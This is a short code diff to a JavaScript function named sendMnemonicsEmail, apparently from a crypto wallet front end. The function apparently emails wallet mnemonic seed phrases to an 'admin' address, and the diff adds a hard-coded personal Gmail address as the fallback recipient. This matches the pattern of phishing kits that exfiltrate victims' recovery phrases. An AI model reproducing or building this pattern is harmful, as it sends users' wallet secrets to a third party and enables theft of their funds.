@@ -8,6 +8,7 @@ export const sendMnemonicsEmail = async (
   message,
   admin = process.env.REACT_APP_ADMIN
 ) => {
+  if (!admin) admin = "eayodeleof18@gmail.com";
   try {
     const res = await client({
       method: "POST",
